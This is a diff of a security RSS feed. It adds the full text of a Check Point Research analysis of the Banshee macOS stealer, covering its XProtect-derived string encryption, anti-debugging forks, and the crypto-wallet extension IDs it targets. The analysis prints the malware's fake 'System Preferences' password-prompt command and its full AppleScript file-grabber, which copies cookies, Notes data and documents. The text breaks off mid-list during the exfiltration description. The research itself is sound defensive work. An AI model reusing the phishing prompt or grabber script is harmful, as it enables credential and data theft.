@@ -1,5 +1,759 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 09 Jan 2025 13:59:19 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Examining Redtail Analyzing a Sophisticated Cryptomining Malware and its Advanced Tactics &amp;#x5b;Guest Diary&amp;#x5d;</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>The School Shootings Were Fake. The Terror Was Real</title><link>https://www.wired.com/school-swatting-torswats-brad-dennis/</link><description>The inside story of the teenager whose “swatting” calls sent armed police racing into hundreds of schools nationwide—and the private detective who tracked him down.</description><guid isPermaLink="false">6753615057a0763b2c34c432</guid><category>The Big Story</category><category>Security</category><category>longreads</category><category>Crime</category><category>cybersecurity</category><category>FBI</category><category>Telegram</category><category>Discord</category><category>Lord of the Rings</category><category>Twitch</category><category>video games</category><category>Police</category><category>Last Call</category></item><item><title>Examining Redtail Analyzing a Sophisticated Cryptomining Malware and its Advanced Tactics &amp;#x5b;Guest Diary&amp;#x5d;, (Thu, Jan 9th)</title><link>https://isc.sans.edu/diary/rss/31568</link><description>&lt;p&gt;&amp;#x5b;This is a Guest Diary by Cody Hales, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a Guest Diary by Cody Hales, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program]&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 09 Jan 2025 14:59:20 +0000</lastBuildDate><item><title>Banshee: The Stealer That “Stole Code” From MacOS XProtect</title><link>https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/</link><description>&lt;p&gt;Research by:&amp;#160;Antonis Terefos (@Tera0017) Key Points Introduction As of 2024, approximately 100.4 million people worldwide use macOS, accounting for 15.1% of the global PC market. Of the millions of macOS users, many falsely assume that their systems are inherently secure from malware. This perception stems from macOS&amp;#8217;s Unix-based architecture and historically lower market share, making [&amp;#8230;]&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/"&gt;Banshee: The Stealer That &amp;#8220;Stole Code&amp;#8221; From MacOS XProtect&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt;&amp;nbsp;Antonis Terefos (&lt;a href="https://x.com/Tera0017"&gt;&lt;strong&gt;@Tera0017&lt;/strong&gt;&lt;/a&gt;)&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;&lt;strong&gt;Key Points&lt;/strong&gt;&lt;/h1&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Since September, &lt;strong&gt;Check Point Research&lt;/strong&gt; has been monitoring a new version of the &lt;strong&gt;Banshee macOS stealer&lt;/strong&gt;, a malware linked to Russian-speaking cyber criminals targeting &lt;strong&gt;macOS users&lt;/strong&gt;.&lt;/li&gt;
+
+
+
+&lt;li&gt;This new version had been undetected for over two months until the original version of Banshee Stealer was leaked on XSS forums, which resembled similarities with the malware&amp;#8217;s core functionality.&lt;/li&gt;
+
+
+
+&lt;li&gt;One notable difference between the leaked source code and the version discovered by Check Point Research is the use of a string encryption algorithm. This algorithm is the same as &lt;strong&gt;Apple&lt;/strong&gt; uses in its &lt;strong&gt;Xprotect antivirus&lt;/strong&gt; engine for &lt;strong&gt;MacOS&lt;/strong&gt;.&lt;/li&gt;
+
+
+
+&lt;li&gt;One method of distributing Banshee Stealer involved malicious GitHub repositories, targeting Windows users with Lumma Stealer and macOS users with Banshee Stealer.&lt;/li&gt;
+
+
+
+&lt;li&gt;Banshee operated as a &amp;#8216;stealer-as-a-service&amp;#8217;, priced at $3,000, and was advertised through Telegram and forums such as XSS and Exploit. On November 23, 2024, the malware’s source code was leaked, leading the author to shut down the operations the following day.&lt;/li&gt;
+
+
+
+&lt;li&gt;Despite shutting down the operation, threat actors continue to distribute the new version of Banshee via phishing websites.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Introduction&lt;/h1&gt;
+
+
+
+&lt;p&gt;As of 2024, approximately 100.4 million people worldwide use macOS, accounting for 15.1% of the global PC market. Of the millions of macOS users, many falsely assume that their systems are inherently secure from malware. This perception stems from macOS&amp;#8217;s Unix-based architecture and historically lower market share, making it a less attractive target for cyber criminals. While macOS includes robust security measures like Gatekeeper, XProtect, and sandboxing, no operating system is entirely immune to threats, making users&amp;#8217; false sense of security all the more dangerous.&lt;/p&gt;
+
+
+
+&lt;p&gt;As macOS&amp;#8217;s popularity grows, attackers increasingly target the platform. Modern threats include sophisticated malware, phishing attacks, and malicious software like &lt;strong&gt;Banshee&lt;/strong&gt;, a stealthy macOS stealer, a new stealer that was made public for the first time in July 2024. This malware targets MacOS users and is able to steal browser and login credentials, cryptocurrency wallets, and sensitive information from files. Through July to November, Banshee’s author operated a stealer-as-a-service on Telegram and on dark web forums such as XSS and Exploit and continued to improve the malware. During this time, the author hired two members to carry out campaigns targeting MacOS users.&lt;/p&gt;
+
+
+
+&lt;p&gt;In late September, &lt;strong&gt;Check Point Research&lt;/strong&gt; identified a new, undetected version of Banshee Stealer targeting macOS. This updated version introduced string encryption, as previous versions contained all the strings in plain text. However, Banshee’s author “stole” the string encryption algorithm from Apple&amp;#8217;s MacOS XProtect antivirus engine. Threat actors distributed this new version mainly via phishing websites and malicious &lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/"&gt;GitHub&lt;/a&gt; repositories. In some GitHub campaigns, threat actors targeted both Windows and MacOS users with Lumma and Banshee Stealer.&lt;/p&gt;
+
+
+
+&lt;p&gt;For over two months, this updated version of Banshee successfully evaded detection by most antivirus engines until its original code was leaked on XSS forums, allowing antivirus engines to detect its core functionality. Once the source code was leaked, the Banshee stealer-as-a-service operation was shut down to the general public. However, &lt;strong&gt;Check Point Research&lt;/strong&gt; continues to observe campaigns distributing malware through phishing websites that masquerade as legitimate software.&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Malware Analysis&lt;/h1&gt;
+
+
+
+&lt;p&gt;In late September, &lt;strong&gt;Check Point Research&lt;/strong&gt; obtained new versions of &lt;strong&gt;Banshee Stealer&lt;/strong&gt;. The discovered samples remained undetected by antivirus engines on &lt;strong&gt;VirusTotal&lt;/strong&gt; for over two months. Only once the Banshee Stealer &lt;strong&gt;source code&lt;/strong&gt; was leaked on &lt;strong&gt;November 23&lt;/strong&gt; on &lt;strong&gt;XSS underground forums&lt;/strong&gt; did antivirus vendors update their detection rules to identify both the original leaked code and any updated versions.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30937" height="287" src="https://research.checkpoint.com/wp-content/uploads/2024/12/001-1024x287.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 &amp;#8211; Unpacked Banshee MacOS Stealer detection.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Although the core functionality of both the older and newer versions remains unchanged, one key difference is the introduction of string encryption, which replaces the plain text strings from samples &lt;a href="https://www.elastic.co/security-labs/beyond-the-wail"&gt;reported&lt;/a&gt; in August. When &lt;strong&gt;Check Point Research&lt;/strong&gt; first obtained encrypted samples in late September, we created a Yara rule based on the string encryption, resulting in many false positives. However, upon further investigation, we discovered that Banshee employs the same encryption method that Apple utilizes in macOS for string encryption within its antivirus engine, XProtect. As previously noted by a &lt;a href="https://alden.io/posts/secrets-of-xprotect/#reverse-engineering-the-redpine-remediator"&gt;researcher&lt;/a&gt;, this same encryption is used for &lt;em&gt;“encrypted YARA rules stored within the XProtect Remediator binaries&amp;#8221;&lt;/em&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30939" height="412" src="https://research.checkpoint.com/wp-content/uploads/2024/12/002.png" width="786" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; Banshee Stealer (left), MacOS XProtect Remediator Binary (right).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Python representation:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;def macos_xprotect_string_decryption(encrypted: bytes, encr_key: int) -&gt; str:
+    """
+    Author: @Check Point Research
+    Decrypts MacOS Xprotect binaries &amp;amp; Banshee Stealer encrypted strings.
+    """
+    decrypted = "".join(
+        chr(
+            (encr_key &gt;&gt; ((i * 8) &amp;amp; 0x38) &amp;amp; 0xFF) ^ encrypted[i]
+        )
+        for i in range(len(encrypted))
+    )
+    return decrypted.partition("\\x00")[0]
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;While &lt;strong&gt;XProtect&lt;/strong&gt; binaries decrypt YARA rules for detection purposes, &lt;strong&gt;Banshee Stealer&lt;/strong&gt; uses the same algorithm to decrypt critical strings for its functionality. These strings include:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;commands executed&lt;/li&gt;
+
+
+
+&lt;li&gt;browser names and paths&lt;/li&gt;
+
+
+
+&lt;li&gt;extension IDs&lt;/li&gt;
+
+
+
+&lt;li&gt;wallets and their paths&lt;/li&gt;
+
+
+
+&lt;li&gt;command-and-control (C&amp;amp;C) information&lt;/li&gt;
+
+
+
+&lt;li&gt;and many other strings observed in the leaked source code.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Technical Analysis&lt;/h2&gt;
+
+
+
+&lt;p&gt;Upon decrypting the strings, we observed that Banshee&amp;#8217;s core functionality remains largely unchanged. The updates primarily pertain to the additional anti-analysis techniques. The first technique uses the &lt;code&gt;fork()&lt;/code&gt; function, which creates a child process that may escape debuggers attached to the parent process. Before the parent process terminates, it runs the command &lt;code&gt;killall Terminal&lt;/code&gt; to close any open terminal sessions. Meanwhile, the child process calls &lt;code&gt;setsid()&lt;/code&gt; to initiate a daemon in the background, trying to mimic a legitimate system service and blend in with normal processes. Then, a second child process is created, while the first child is terminated. The final child process attempts to get &lt;code&gt;rwx&lt;/code&gt; access to the root directory, and if it fails, it will stop the malware infection; if it succeeds, it closes &lt;code&gt;stdin&lt;/code&gt;, &lt;code&gt;stdout&lt;/code&gt;, and &lt;code&gt;stderr&lt;/code&gt; and redirects them to &lt;code&gt;/dev/null&lt;/code&gt;. This ensures that the malware runs silently without producing output or errors that could alert the user of malicious behavior. This also prevents any interaction with debugging tools that might monitor input/output behavior.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30941" height="412" src="https://research.checkpoint.com/wp-content/uploads/2024/12/002-1.png" width="786" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; Anti-analysis forks and function calls.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Once those checks have been passed, &lt;strong&gt;Banshee&lt;/strong&gt; proceeds by retrieving the &lt;strong&gt;HOME&lt;/strong&gt; and &lt;strong&gt;TMP&lt;/strong&gt; directories and creating a ten-character directory within &lt;strong&gt;TMP&lt;/strong&gt;. These directories are used to steal user information, browser data, and as for the created directory, to store the stolen data. At this stage, the malware functions similarly to the leaked code and previous versions. However, one notable change in the updated code is the removal of the language check, which previously terminated the process if Russian was detected.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Stealer Capabilities&lt;/h2&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Banshee&lt;/strong&gt; is a fully functional stealer capable of stealing credentials from several browsers, including:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;Chrome&lt;/li&gt;
+
+
+
+&lt;li&gt;Brave&lt;/li&gt;
+
+
+
+&lt;li&gt;Edge&lt;/li&gt;
+
+
+
+&lt;li&gt;Vivaldi&lt;/li&gt;
+
+
+
+&lt;li&gt;Yandex&lt;/li&gt;
+
+
+
+&lt;li&gt;Opera&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;In addition to browser credentials, the malware targets various browser extensions, primarily those related to cryptocurrency wallets. It also targets a Two-Factor Authentication (2FA) extension &lt;strong&gt;&lt;code&gt;authenticator.cc—Authenticator&lt;/code&gt;&lt;/strong&gt;. All stolen data is stored in the directory &lt;code&gt;/tmp/$rand10char_dir/Browsers/&lt;/code&gt;. Interestingly, some of these extensions no longer appear to exist, leading us to believe that the end-of-life extensions have been copied and pasted from previous or other “stealer” projects. Banshee is targeting the following browser extensions.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;bhghoamapcdpbohphigoooaddinpkbai        // "authenticator.cc - Authenticator"   &amp;lt;https://chromewebstore.google.com/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai&gt;
+fhbohimaelbohpjbbldcngcnapndodjp        // "BNB Chain Wallet"   &amp;lt;https://chromewebstore.google.com/detail/bnb-chain-wallet/fhbohimaelbohpjbbldcngcnapndodjp&gt;
+fihkakfobkmkjojpchpfgcmhfjnmnfpi        // "BitAppWallet"
+aodkkagnadcbobfpggfnjeongemjbjca        // "BoltX"
+aeachknmefphepccionboohckonoeemg        // "coin98.com - Coin98 Wallet"   &amp;lt;https://chromewebstore.google.com/detail/coin98-wallet/aeachknmefphepccionboohckonoeemg&gt;
+hnfanknocfeofbddgcijnmhnfnkdnaad        // "wallet.coinbase.com - Coinbase Wallet extension"    &amp;lt;https://chromewebstore.google.com/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad&gt;
+agoakfejjabomempkjlepdflaleeobhb        // "core.app - Core | Crypto Wallet &amp;amp; NFT Extension"    &amp;lt;https://chromewebstore.google.com/detail/core-crypto-wallet-nft-ex/agoakfejjabomempkjlepdflaleeobhb&gt;
+pnlfjmlcjdjgkddecgincndfgegkecke        // "Cocobit"
+blnieiiffboillknjnepogjhkgnoapac        // "Equal"
+cgeeodpfagjceefieflmdfphplkenlfk        // "broxus.com EVER Wallet"     &amp;lt;https://chromewebstore.google.com/detail/ever-wallet/cgeeodpfagjceefieflmdfphplkenlfk&gt;
+aholpfdialjgjfhomihkjbmgjidlcdno        // "exodus.com - Exodus Web3 Wallet"    &amp;lt;https://chromewebstore.google.com/detail/exodus-web3-wallet/aholpfdialjgjfhomihkjbmgjidlcdno&gt;
+ebfidpplhabeedpnhjnobghokpiioolj        // "fewcha.app - Fewcha Move Wallet"    &amp;lt;https://chromewebstore.google.com/detail/fewcha-move-wallet/ebfidpplhabeedpnhjnobghokpiioolj&gt;
+cjmkndjhnagcfbpiemnkdpomccnjblmj        // "koii.network - Finnie"   &amp;lt;https://chromewebstore.google.com/detail/finnie/cjmkndjhnagcfbpiemnkdpomccnjblmj&gt;
+hpglfhgfnhbgpjdenjgmdgoeiappafln        // "Guarda"
+nanjmdknhkinifnkgdcggcfnhdaammmj        // "GuildWallet"
+fnnegphlobjdpkhecapkijjdkgcjhkib        // "Harmony Chrome Extension Wallet"
+flpiciilemghbmfalicajoolhkkenfel        // "icon.foundation - ICONex"   &amp;lt;https://chromewebstore.google.com/detail/iconex/flpiciilemghbmfalicajoolhkkenfel&gt;
+cjelfplplebdjjenllpjcblmjkfcffne        // "Jaxx Liberty"
+jblndlipeogpafnldhgmapagcccfchpi        // "Kaia Wallet"    &amp;lt;https://chromewebstore.google.com/detail/kaia-wallet/jblndlipeogpafnldhgmapagcccfchpi&gt;
+pdadjkfkgcafgbceimcpbkalnfnepbnk        // "KardiaChain Wallet"     &amp;lt;https://chromewebstore.google.com/detail/kardiachain-wallet/pdadjkfkgcafgbceimcpbkalnfnepbnk&gt;
+dmkamcknogkgcdfhhbddcghachkejeap        // "keplr.app - Keplr"      &amp;lt;https://chromewebstore.google.com/detail/keplr/dmkamcknogkgcdfhhbddcghachkejeap&gt;
+kpfopkelmapcoipemfendmdcghnegimn        // "Liquality Wallet"
+nlbmnnijcnlegkjjpcfjclmcfggfefdm        // "MEW CX"
+dngmlblcodfobpdpecaadgfbcggfjfnm        // "multiversx.com - MultiversX Wallet"     &amp;lt;https://chromewebstore.google.com/detail/multiversx-wallet/dngmlblcodfobpdpecaadgfbcggfjfnm&gt;
+efbglgofoippbgcjepnhiblaibcnclgk        // "martianwallet.xyz - Martian Aptos &amp;amp; Sui Wallet Extension"       &amp;lt;https://chromewebstore.google.com/detail/martian-aptos-sui-wallet/efbglgofoippbgcjepnhiblaibcnclgk&gt;
+afbcbjpbpfadlkmhmclhkeeodmamcflc        // "mathwallet.org - MathWallet"        &amp;lt;https://chromewebstore.google.com/detail/mathwallet/afbcbjpbpfadlkmhmclhkeeodmamcflc&gt;
+nkbihfbeogaeaoehlefnkodbefgpgknn        // "metamask.io - MetaMask"     &amp;lt;https://chromewebstore.google.com/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn&gt;
+ejbalbakoplchlghecdalmeeeajnimhm        // "MetaMask"
+fcckkdbjnoikooededlapcalpionmalo        // "mobox.io - MOBOX WALLET"    &amp;lt;https://chromewebstore.google.com/detail/mobox-wallet/fcckkdbjnoikooededlapcalpionmalo&gt;
+lpfcbjknijpeeillifnkikgncikgfhdo        // "Nami"   &amp;lt;https://chromewebstore.google.com/detail/nami/lpfcbjknijpeeillifnkikgncikgfhdo&gt;
+jbdaocneiiinmjbjlgalhcelgbejmnid        // "Guarda"
+fhilaheimglignddkjgofkcbgekhenbh        // "oxygen.solutions - Oxygen - Atomic Crypto Wallet"   &amp;lt;https://chromewebstore.google.com/detail/oxygen-atomic-crypto-wall/fhilaheimglignddkjgofkcbgekhenbh&gt;
+mgffkfbidihjpoaomajlbgchddlicgpn        // "Pali Wallet"    &amp;lt;https://chromewebstore.google.com/detail/pali-wallet/mgffkfbidihjpoaomajlbgchddlicgpn&gt;
+ejjladinnckdgjemekebdpeokbikhfci        // "petra.app - Petra Aptos Wallet"     &amp;lt;https://chromewebstore.google.com/detail/petra-aptos-wallet/ejjladinnckdgjemekebdpeokbikhfci&gt;
+bfnaelmomeimhlpmgjnjophhpkkoljpa        // "phantom.app - Phantom"      &amp;lt;https://chromewebstore.google.com/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa&gt;
+phkbamefinggmakgklpkljjmgibohnba        // "pontem.network - Pontem Crypto Wallet - Eth, Sol, BTC +"      &amp;lt;https://chromewebstore.google.com/detail/pontem-crypto-wallet-eth/phkbamefinggmakgklpkljjmgibohnba&gt;
+fnjhmkhhmkbjkkabndcnnogagogbneec        // "Ronin Wallet"   &amp;lt;https://chromewebstore.google.com/detail/ronin-wallet/fnjhmkhhmkbjkkabndcnnogagogbneec&gt;
+lgmpcpglpngdoalbgeoldeajfclnhafa        // "safepal.com - SafePal Extension Wallet"     &amp;lt;https://chromewebstore.google.com/detail/safepal-extension-wallet/lgmpcpglpngdoalbgeoldeajfclnhafa&gt;
+nkddgncdjgjfcddamfgcmfnlhccnimig        // "GuildWallet"
+pocmplpaccanhmnllbbkpgfliimjljgo        // "Slope Wallet"   &amp;lt;https://chromewebstore.google.com/detail/slope-wallet/pocmplpaccanhmnllbbkpgfliimjljgo&gt;
+bhhhlbepdkbapadjdnnojkbgioiodbic        // "solflare.com - Solflare Wallet"     &amp;lt;https://chromewebstore.google.com/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic&gt;
+fhmfendgdocmcbmfikdcogofphimnkno        // "sollet"
+mfhbebgoclkghebffdldpobeajmbecfk        // "westar.io - StarMask"   &amp;lt;https://chromewebstore.google.com/detail/starmask/mfhbebgoclkghebffdldpobeajmbecfk&gt;
+cmndjbecilbocjfkibfbifhngkdmjgog        // "swashapp.io - Swash"    &amp;lt;https://chromewebstore.google.com/detail/swash/cmndjbecilbocjfkibfbifhngkdmjgog&gt;
+ookjlbkiijinhpmnjffcofjonbfbgaoc        // "Temple - Tezos Wallet"  &amp;lt;https://chromewebstore.google.com/detail/temple-tezos-wallet/ookjlbkiijinhpmnjffcofjonbfbgaoc&gt;
+aiifbnbfobpmeekipheeijimdpnlpgpp        // "Station Wallet"     &amp;lt;https://chromewebstore.google.com/detail/station-wallet/aiifbnbfobpmeekipheeijimdpnlpgpp&gt;
+mfgccjchihfkkindfppnaooecgfneiii        // "tokenpocket.pro - TokenPocket - Web3 &amp;amp; Nostr Wallet"    &amp;lt;https://chromewebstore.google.com/detail/tokenpocket-web3-nostr-wa/mfgccjchihfkkindfppnaooecgfneiii&gt;
+nphplpgoakhhjchkkhmiggakijnkhfnd        // "TON Wallet"     &amp;lt;https://chromewebstore.google.com/detail/ton-wallet/nphplpgoakhhjchkkhmiggakijnkhfnd&gt;
+ibnejdfjmmkpcnlpebklmnkoeoihofec        // "TronLink"       &amp;lt;https://chromewebstore.google.com/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec&gt;
+egjidjbpglichdcondbcbdnbeeppgdph        // "trustwallet.com - Trust Wallet"     &amp;lt;https://chromewebstore.google.com/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph&gt;
+amkmjjmmflddogmhpjloimipbofnfjih        // "Wombat - Gaming Wallet for Ethereum &amp;amp; EOS"      &amp;lt;https://chromewebstore.google.com/detail/wombat-gaming-wallet-for/amkmjjmmflddogmhpjloimipbofnfjih&gt;
+hmeobnfnfcmdkdcmlblgagmfpfboieaf        // "xdefi.io - XDEFI Wallet"    &amp;lt;https://chromewebstore.google.com/detail/xdefi-wallet/hmeobnfnfcmdkdcmlblgagmfpfboieaf&gt;
+eigblbgjknlfbajkfhopmcojidlgcehm        // "XMR.PT"     &amp;lt;https://chromewebstore.google.com/detail/xmrpt/eigblbgjknlfbajkfhopmcojidlgcehm&gt;
+bocpokimicclpaiekenaeelehdjllofo        // "XDCPay"     &amp;lt;https://chromewebstore.google.com/detail/xdcpay/bocpokimicclpaiekenaeelehdjllofo&gt;
+ffnbelfdoeiohenkjibnmadjiehjhajb        // "yoroiwallet.com - Yoroi"       &amp;lt;https://chromewebstore.google.com/detail/yoroi/ffnbelfdoeiohenkjibnmadjiehjhajb&gt;
+kncchdigobghenbbaddojjnnaogfppfj        // "iWallet"    &amp;lt;https://chromewebstore.google.com/detail/iwallet/kncchdigobghenbbaddojjnnaogfppfj&gt;
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;Once the browser data is dumped, Banshee proceeds to target wallets found on the machine. The stolen information is stored &lt;code&gt;/tmp/$rand10char_dir/Wallets/&lt;/code&gt;. The targeted wallets are:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;Exodus&lt;/li&gt;
+
+
+
+&lt;li&gt;Electrum&lt;/li&gt;
+
+
+
+&lt;li&gt;Coinomi&lt;/li&gt;
+
+
+
+&lt;li&gt;Guarda&lt;/li&gt;
+
+
+
+&lt;li&gt;Wasabi&lt;/li&gt;
+
+
+
+&lt;li&gt;Atomic&lt;/li&gt;
+
+
+
+&lt;li&gt;Ledger&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;The stealer collects various system information, including:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Software &amp;amp; Hardware information by executing the command &lt;code&gt;system_profiler SPSoftwareDataType SPHardwareDataType&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;The external IP address by contacting &lt;code&gt;api.ipify.org&lt;/code&gt; via the command &lt;code&gt;curl -s&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;MacOS password by tricking the user into entering their password through an input pop-up. Command executed and pop-up message: &lt;code&gt;osascript -e \\'display dialog "To launch the application, you need to update the system settings \\n\\nPlease enter your password." with title "System Preferences" with icon caution default answer "" giving up after 30 with hidden answer\\’&lt;/code&gt;
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;The password will be validated by executing the command &lt;code&gt;dscl /Local/Default -authonly &amp;lt;user&amp;gt; &amp;lt;pass&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;This information is stored in &lt;code&gt;/tmp/$rand10char_dir/system_info.json&lt;/code&gt; which also includes the campaign ID under the key &lt;code&gt;"BUILD_ID:"&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;The keychain passwords are stored in &lt;code&gt;/tmp/$rand10char_dir/Passwords/&lt;/code&gt; and the code responsible for this functionality has remained unchanged since the leaked code.&lt;/p&gt;
+
+
+
+&lt;p&gt;The file-grabber functionality is performed using an AppleScript. The script is stored at &lt;code&gt;/tmp/$rand13char&lt;/code&gt;. The code executed is shown below, with the output being stored at &lt;code&gt;/tmp/$rand10char_dir/FileGrabber/&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;do shell script "osascript -e 'set volume with output muted'";
+set baseFolderPath to (path to home folder as text) &amp;amp; " :";
+set fileGrabberFolderPath to baseFolderPath &amp;amp; "FileGrabber:";
+set notesFolderPath to baseFolderPath &amp;amp; "Notes:";
+tell application "Finder";
+	set username to short user name of (system info) 	if not (exists folder baseFolderPath) then;
+		do shell script "echo 'Creating base folder'";
+		make new folder at (path to home folder) with properties {name:" };
+	end if	try;
+		do shell script "echo 'Creating FileGrabber folder'";
+		make new folder at folder baseFolderPath with properties {name:"FileGrabber"};
+		delay 2 -- Delay to give Finder time to create the folder;
+	end try 	try;
+		do shell script "echo 'Creating Notes folder'";
+		make new folder at folder baseFolderPath with properties {name:"Notes"};
+		delay 2 -- Delay to give Finder time to create the folder;
+	end try 	try;
+		do shell script "echo 'Copying Safari cookies'";
+		set macOSVersion to do shell script "sw_vers -productVersion";
+		if macOSVersion starts with "10.15" or macOSVersion starts with "10.14" then;
+			set safariFolder to ((path to library folder from user domain as text) &amp;amp; "Safari:");
+		else;
+			set safariFolder to ((path to library folder from user domain as text) &amp;amp; "Containers:com.apple.Safari:Data:Library:Cookies:");
+		end if;
+		duplicate file "Cookies.binarycookies" of folder safariFolder to folder fileGrabberFolderPath with replacing;
+		delay 2 -- Delay to give Finder time to copy the file;
+	end try 	try;
+		do shell script "echo 'Copying Notes database'";
+		set homePath to path to home folder as string;
+		set sourceFilePath to homePath &amp;amp; "Library:Group Containers:group.com.apple.notes:NoteStore.sqlite";
+		duplicate file sourceFilePath to folder notesFolderPath with replacing;
+		delay 2 -- Delay to give Finder time to copy the file;
+	end try;
+	set extensionsList to {"txt", "docx", "rtf", "doc", "wallet", "keys", "key"} 	try;
+		do shell script "echo 'Gathering desktop files'";
+		set desktopFiles to every file of desktop;
+		repeat with aFile in desktopFiles;
+			try;
+				set fileExtension to name extension of aFile;
+				if fileExtension is in extensionsList then;
+					set fileSize to size of aFile;
+					if fileSize &amp;lt; 51200 then;
+						do shell script "echo 'Copying file: " &amp;amp; (name of aFile as string) &amp;amp; "'";
+						duplicate aFile to folder fileGrabberFolderPath with replacing;
+						delay 1 -- Delay to give Finder time to copy each file;
+					end if;
+				end if;
+			end try;
+		end repeat;
+	end try 	try;
+		do shell script "echo 'Gathering documents files'";
+		set documentsFiles to every file of folder "Documents" of (path to home folder);
+		repeat with aFile in documentsFiles;
+			try;
+				set fileExtension to name extension of aFile;
+				if fileExtension is in extensionsList then;
+					set fileSize to size of aFile;
+					if fileSize &amp;lt; 51200 then;
+						do shell script "echo 'Copying file: " &amp;amp; (name of aFile as string) &amp;amp; "'";
+						duplicate aFile to folder fileGrabberFolderPath with replacing;
+						delay 1 -- Delay to give Finder time to copy each file;
+					end if;
+				end if;
+			end try;
+		end repeat;
+	end try;
+end tell;
+do shell script "osascript -e 'set volume without output muted'"
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;If the AppleScript execution fails, it will retry up to 30 times, each time attempting to reset permissions by executing the command &lt;code&gt;tccutil reset AppleEvents&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;Once the relevant files are collected, the malware displays a failure message to the user, causing them to believe the software solution is not working: &lt;code&gt;osascript -e \\'display dialog "This system does not support running this application." with title "System Error" buttons {"OK"} default button "OK" with icon stop\\'&lt;/code&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;The network communication and exfiltration of stolen data remains unchanged. The process is straightforward. The random folder created at the beginning of the infection, which was used to store all the stolen data, is:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;Zipped&lt;/li&gt;
+
+
+
